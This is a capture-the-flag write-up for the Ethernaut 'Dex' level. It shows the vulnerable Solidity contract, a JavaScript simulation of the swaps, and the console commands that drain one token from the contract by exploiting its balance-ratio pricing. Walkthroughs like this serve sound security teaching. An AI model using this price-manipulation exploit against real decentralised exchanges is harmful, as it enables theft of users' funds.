# 22 - Dex

Ethernaut Level22: [Dex](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

## Solution

Let's see the result of swap with js script.

```javascript
const player = {
  token1: 10,
  token2: 10,
};

const dexContract = {
  token1: 100,
  token2: 100,
};

function getSwapPrice(from, to, amount) {
  return Math.floor((amount * dexContract[to]) / dexContract[from]);
}

function swap(from, to, amount) {
  const swapAmount = getSwapPrice(from, to, amount);
  player[from] -= amount;
  dexContract[from] += amount;

  dexContract[to] -= swapAmount;
  player[to] += swapAmount;

  console.log("====================after swap====================");
  console.log("\t player  dexContract");
  console.log("token1: ", player.token1, "\t", dexContract.token1);
  console.log("token2: ", player.token2, "\t", dexContract.token2);
  console.log("");
}
```

```javascript
function main() {
  swap("token1", "token2", player.token1);
  swap("token2", "token1", player.token2);
  swap("token1", "token2", player.token1);
  swap("token2", "token1", player.token2);
  swap("token1", "token2", player.token1);
  swap("token2", "token1", player.token2);
}

main();
```

```
====================after swap====================
         player  dexContract
token1:  0       110
token2:  20      90

====================after swap====================
         player  dexContract
token1:  24      86
token2:  0       110

====================after swap====================
         player  dexContract
token1:  0       110
token2:  30      80

====================after swap====================
         player  dexContract
token1:  41      69
token2:  0       110

====================after swap====================
         player  dexContract
token1:  0       110
token2:  65      45

====================after swap====================
         player  dexContract
token1:  158     -48  // <- here
token2:  0       110
```

If we keep swapping all the token amount we have like this, \
the contract's balance becomes less than `0`.

Before the last swap above, player has `0 token1` and `65 token2`.

And Dex contract has `110 token1` and `45 token2`.

The price of swap will be `Math.floor(amount * 110/45)`.

So if we swap `45 token2`, the player gets `110 token1` which finally makes the `token1` balance of the contract `0`.

```javascript
function main() {
  swap("token1", "token2", player.token1);
  swap("token2", "token1", player.token2);
  swap("token1", "token2", player.token1);
  swap("token2", "token1", player.token2);
  swap("token1", "token2", player.token1);
  swap("token2", "token1", 45);
}

main();
```

```
====================after swap====================
         player  dexContract
token1:  0       110
token2:  20      90

====================after swap====================
         player  dexContract
token1:  24      86
token2:  0       110

====================after swap====================
         player  dexContract
token1:  0       110
token2:  30      80

====================after swap====================
         player  dexContract
token1:  41      69
token2:  0       110

====================after swap====================
         player  dexContract
token1:  0       110
token2:  65      45

====================after swap====================
         player  dexContract
token1:  110     0  // <- here!
token2:  20      90
```

<pre class="language-javascript"><code class="lang-javascript">> const token1 = await contract.token1();
  const token2 = await contract.token2();
  await contract.approve(contract.address, 100000000);
  
> await contract.swap(token1, token2, (await contract.balanceOf(token1, player)).toString());

<strong>> await contract.swap(token2, token1, (await contract.balanceOf(token2, player)).toString());
</strong>
> await contract.swap(token1, token2, (await contract.balanceOf(token1, player)).toString());  

> await contract.swap(token2, token1, (await contract.balanceOf(token2, player)).toString());

> await contract.swap(token1, token2, (await contract.balanceOf(token1, player)).toString());

> await contract.swap(token2, token1, 45);

</code></pre>

Done! 😎
